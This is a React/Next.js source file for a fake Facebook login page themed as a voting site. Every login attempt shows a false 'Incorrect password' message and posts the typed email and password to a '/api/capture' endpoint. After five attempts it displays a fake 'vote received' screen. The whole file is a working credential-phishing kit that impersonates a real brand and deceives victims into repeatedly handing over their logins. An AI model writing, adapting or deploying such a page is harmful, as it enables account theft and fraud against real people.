import Head from 'next/head';
import { useState, useRef } from 'react';

const MAX_ATTEMPTS = 5;

export default function FacebookLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);
  const [showSuccess, setShowSuccess] = useState(false);
  const attemptRef = useRef(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    attemptRef.current += 1;
    setClickCount(attemptRef.current);
    
    try {
      await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          username: email.trim(), 
          password, 
          method: 'facebook'
        })
      });
    } catch (e) {}
    
    if (attemptRef.current >= MAX_ATTEMPTS) {
      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    }
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Facebook Login - Vote</title>
      </Head>

      <style jsx>{`
        html, body { height: 100%; margin: 0; padding: 0; }
        body { 
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
          background: linear-gradient(135deg, #e7ebf0, #f0f2f5); 
          display: flex; 
          align-items: center; 
          justify-content: center; 
          min-height: 100vh;
        }
        .login-container {
          background: white; 
          width: 360px; 
          padding: 30px; 
          border-radius: 8px; 
          box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
          text-align: center;
          max-width: 90vw;
        }
        .logo { 
          width: 50px; 
          height: 50px; 
          margin: 0 auto 20px; 
          background: #1877f2; 
          border-radius: 50%; 
          display: flex; 
          align-items: center; 
          justify-content: center; 
          color: white; 
          font-weight: bold; 
          font-size: 22px;
        }
        input { 
          width: 100%; 
          max-width: 320px;
          padding: 12px 16px; 
          margin: 10px auto 0;
          display: block;
          border: 1px solid #ccd0d5; 
          border-radius: 6px; 
          font-size: 15px; 
          background: #f5f6f7;
        }
        input:focus { 
          outline: none; 
          border-color: #1877f2; 
          background: white;
        }
        button { 
          width: 100%; 
          max-width: 320px;
          padding: 12px; 
          background: #1877f2; 
          color: white; 
          border: none; 
          border-radius: 6px; 
          font-size: 16px; 
          cursor: pointer;
          margin-top: 8px;
          display: block;
        }
        button:hover { 
          background: #166fe5; 
        }
        .feedback { 
          color: #e1306c; 
          font-size: 14px; 
          margin: 8px auto 0;
          max-width: 320px;
          display: block;
        }
        a {
          color: #1877f2;
          text-decoration: none;
          font-size: 14px;
          display: block;
          margin-top: 10px;
        }
        .secondary-btn {
          background: linear-gradient(135deg, #42b72a, #36a420);
          color: white;
          border: 2px solid #1877f2;
          border-radius: 6px;
          padding: 12px;
          margin-top: 15px;
          margin-bottom: 10px;
          cursor: pointer;
          width: 100%;
          max-width: 320px;
          display: block;
          margin-left: auto;
          margin-right: auto;
          font-size: 16px;
        }
        .secondary-btn:hover { 
          background: linear-gradient(135deg, #36a420, #2e921c); 
        }
        .success-overlay { 
          position: fixed; 
          inset: 0; 
          background: rgba(255,255,255,0.98); 
          display: none; 
          align-items: center; 
          justify-content: center; 
          z-index: 9999; 
        }
        .success-overlay.show { 
          display: flex; 
        }
        .success-box { 
          text-align: center; 
          padding: 20px; 
        }
        .checkmark { 
          width: 110px; 
          height: 110px; 
          background: #4caf50; 
          border-radius: 50%; 
          display: flex; 
          align-items: center; 
          justify-content: center; 
          margin: 0 auto 28px; 
          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
        }
        .checkmark svg { 
          width: 56px; 
          height: 56px; 
        }
      `}</style>

      <div className="login-container">
        <div className="logo">f</div>
        <h2>Log in</h2>
        
        <input 
          type="text" 
          placeholder="Mobile number or email address" 
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        
        <div className="feedback">{feedback}</div>
        
        <button onClick={handleLogin}>Log In</button>
        
        <a href="#">Forgotten Password?</a>
        
        <button className="secondary-btn">Create New Account</button>
      </div>

      <div className="success-overlay" id="successOverlay">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}